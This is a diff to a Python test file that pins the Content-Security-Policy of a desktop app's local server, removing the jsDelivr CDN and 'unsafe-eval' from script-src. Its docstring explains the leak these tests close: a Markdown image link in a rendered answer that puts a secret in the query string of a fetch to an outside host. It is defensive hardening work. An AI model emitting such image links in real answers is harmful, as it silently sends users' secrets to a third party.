@@ -4,9 +4,9 @@ The desktop window is this server's own `index.html` (Tauri loads it as an exter
 was served with no policy, so `"csp": null` in `tauri.conf.json` was never the setting in force. An
 answer rendered as Markdown could carry `![x](https://host/?d=<secret>)` and the WebView fetched
 it by itself, outside the taint ledger and `CHIMERA_EGRESS_ALLOW`. These tests pin the header on
-every route that hands out a page, and pin the directives that close that channel — plus the ones
-the HTML preview needs, because the preview frame inherits this policy and a "tightening" that
-drops them blanks every `render_chart` page in the viewer.
+every route that hands out a page, and pin the directives that close that channel — plus what the
+HTML preview needs, because the preview frame inherits this policy. Since charts are drawn by the
+app (study 29, P6.1) that is only 'unsafe-inline': no CDN, no 'unsafe-eval'.
 """
 
 from __future__ import annotations
@@ -90,12 +90,17 @@ def test_connections_reach_this_origin_and_only_the_remotes_the_servers_screen_a
     assert "*" not in connect and "http:" not in connect
 
 
-def test_the_preview_frame_still_gets_what_a_chart_needs(tmp_path: Path) -> None:
-    # A srcdoc frame inherits this policy, and both must allow a script for it to run. render_chart
-    # writes an inline script that loads Vega from jsDelivr, and Vega compiles expressions with
-    # `new Function` — measured in Edge: without 'unsafe-eval' HERE the chart draws nothing.
+def test_the_page_admits_no_other_sites_script_and_no_eval(tmp_path: Path) -> None:
+    # A srcdoc frame inherits this policy, and both must allow a script for it to run, so a
+    # previewed page's inline scripts need 'unsafe-inline' here. This test used to REQUIRE jsDelivr
+    # and 'unsafe-eval' too: render_chart's pages loaded Vega from that CDN, and Vega compiled
+    # expressions with `new Function` (measured in Edge: without 'unsafe-eval' here, blank). Charts
+    # are drawn by the app's own Vega now, with an interpreter and no loader (study 29, P6.1), so
+    # the test pins the opposite: the CDN admitted any package a page named, and 'unsafe-eval'
+    # applied to the app's own page, not only to the preview.
     script = _directives(_client(tmp_path).get("/").headers["content-security-policy"])["script-src"]
-    assert {"'self'", "'unsafe-inline'", "'unsafe-eval'", "https://cdn.jsdelivr.net"} <= set(script)
+    assert script == ["'self'", "'unsafe-inline'"]
+    assert "'unsafe-eval'" not in script and not any("jsdelivr" in s for s in script)
     # And nothing broader: a scheme or a wildcard here would let any host's script into the page.
     assert not {"*", "https:", "http:", "data:"} & set(script)
 
